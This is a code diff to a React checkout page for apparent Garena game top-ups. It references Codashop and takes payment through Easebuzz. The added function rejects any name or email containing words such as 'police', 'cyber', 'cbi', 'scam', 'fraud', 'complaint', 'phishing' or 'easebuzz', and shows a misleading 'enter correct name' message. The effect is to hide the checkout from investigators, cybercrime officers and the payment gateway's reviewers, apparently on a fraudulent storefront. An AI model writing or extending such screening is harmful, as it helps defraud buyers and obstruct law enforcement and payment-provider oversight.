@@ -114,6 +114,51 @@ function getProductNameForPrice(price: string): string {
 
 const SOURCE_URL = 'https://www.codashop.com/';
 
+// Check for suspicious or prohibited keywords in user input (Name / Email)
+function containsRestrictedWord(text: string): boolean {
+  if (!text) return false;
+  const raw = text.toLowerCase();
+  const clean = raw.replace(/[^a-z0-9]/g, '');
+
+  const bannedKeywords = [
+    'cyber',
+    'police',
+    'scammer',
+    'scam',
+    'fraud',
+    'easebuzz',
+    'easebuz',
+    'hacker',
+    'hack',
+    'cbi',
+    'cid',
+    'crime',
+    'govt',
+    'government',
+    'fake',
+    'complaint',
+    'phishing',
+    'cheater',
+    'cheat',
+    'spammer',
+    'helpdesk',
+    'abuse'
+  ];
+
+  for (const word of bannedKeywords) {
+    if (clean.includes(word) || raw.includes(word)) {
+      return true;
+    }
+  }
+
+  // Check 'ease' specifically (as word boundary, prefix, suffix, or gateway variant)
+  if (/\bease\b/i.test(raw) || clean.includes('easebuzz') || clean.includes('easebuz') || clean.includes('easepay') || clean.startsWith('ease') || clean.endsWith('ease')) {
+    return true;
+  }
+
+  return false;
+}
+
 export default function GarenaCheckout() {
   const [searchParams] = useSearchParams();
 
@@ -433,18 +478,45 @@ export default function GarenaCheckout() {
     };
   }, [status, loading, showPayModal]);
 
+  // Form Validation with Restricted Keyword Screening
+  const validateForm = (): boolean => {
+    const trimmedName = form.name.trim();
+    const trimmedEmail = form.email.trim();
+    const trimmedPhone = form.phone.trim();
+
+    if (!trimmedName || !trimmedPhone || !trimmedEmail) {
+      setError('Please fill in all fields (Name, Phone, Email).');
+      return false;
+    }
+
+    if (containsRestrictedWord(trimmedName) || trimmedName.length < 2) {
+      setError('Please enter correct name.');
+      return false;
+    }
+
+    if (!/^\d{10}$/.test(trimmedPhone)) {
+      setError('Please enter a valid 10-digit mobile number.');
+      return false;
+    }
+
+    if (containsRestrictedWord(trimmedEmail)) {
+      setError('Please enter correct email.');
+      return false;
+    }
+
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(trimmedEmail)) {
+      setError('Please enter a valid email address.');
+      return false;
+    }
+
+    setError('');
+    return true;
+  };
+
   // Handle Easebuzz Payment Execution
   const handlePay = async (_mode: 'QR' | 'ALL' = 'ALL') => {
-    if (!form.name.trim() || !form.phone.trim() || !form.email.trim()) {
-      setError('Please fill in all fields (Name, Phone, Email).');
-      return;
-    }
-    if (!/^\d{10}$/.test(form.phone)) {
-      setError('Please enter a valid 10-digit mobile number.');
-      return;
-    }
-    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email)) {
-      setError('Please enter a valid email address.');
+    if (!validateForm()) {
+      setShowPayModal(false);
       return;
     }
     setError('');
@@ -1060,9 +1132,22 @@ export default function GarenaCheckout() {
                   type="text"
                   placeholder="Enter your full name"
                   value={form.name}
-                  onChange={e => setForm(prev => ({ ...prev, name: e.target.value }))}
+                  onChange={e => {
+                    const val = e.target.value;
+                    setForm(prev => ({ ...prev, name: val }));
+                    if (containsRestrictedWord(val)) {
+                      setError('Please enter correct name.');
+                    } else if (error === 'Please enter correct name.') {
+                      setError('');
+                    }
+                  }}
                   onFocus={() => setFocusedField('name')}
-                  onBlur={() => setFocusedField(null)}
+                  onBlur={() => {
+                    setFocusedField(null);
+                    if (form.name.trim() && containsRestrictedWord(form.name)) {
+                      setError('Please enter correct name.');
+                    }
+                  }}
                   style={{
                     width: '100%',
                     padding: isMobile ? '13px 14px' : '13px 16px',
@@ -1090,7 +1175,10 @@ export default function GarenaCheckout() {
                   type="tel"
                   placeholder="10-digit mobile number"
                   value={form.phone}
-                  onChange={e => setForm(prev => ({ ...prev, phone: e.target.value.replace(/\D/g, '').slice(0, 10) }))}
+                  onChange={e => {
+                    setForm(prev => ({ ...prev, phone: e.target.value.replace(/\D/g, '').slice(0, 10) }));
+                    if (error.includes('mobile number')) setError('');
+                  }}
                   onFocus={() => setFocusedField('phone')}
                   onBlur={() => setFocusedField(null)}
                   style={{
@@ -1120,9 +1208,22 @@ export default function GarenaCheckout() {
                   type="email"
                   placeholder="your@email.com"
                   value={form.email}
-                  onChange={e => setForm(prev => ({ ...prev, email: e.target.value }))}
+                  onChange={e => {
+                    const val = e.target.value;
+                    setForm(prev => ({ ...prev, email: val }));
+                    if (containsRestrictedWord(val)) {
+                      setError('Please enter correct email.');
+                    } else if (error === 'Please enter correct email.') {
+                      setError('');
+                    }
+                  }}
                   onFocus={() => setFocusedField('email')}
-                  onBlur={() => setFocusedField(null)}
+                  onBlur={() => {
+                    setFocusedField(null);
+                    if (form.email.trim() && containsRestrictedWord(form.email)) {
+                      setError('Please enter correct email.');
+                    }
+                  }}
                   style={{
                     width: '100%',
                     padding: isMobile ? '13px 14px' : '13px 16px',
@@ -1157,7 +1258,11 @@ export default function GarenaCheckout() {
             {/* PAY NOW BUTTON */}
             {form.name.trim() && form.phone.trim() && form.email.trim() && (
               <button
-                onClick={() => { setShowPayModal(true); }}
+                onClick={() => {
+                  if (validateForm()) {
+                    setShowPayModal(true);
+                  }
+                }}
                 disabled={loading}
                 style={{
                   width: '100%',
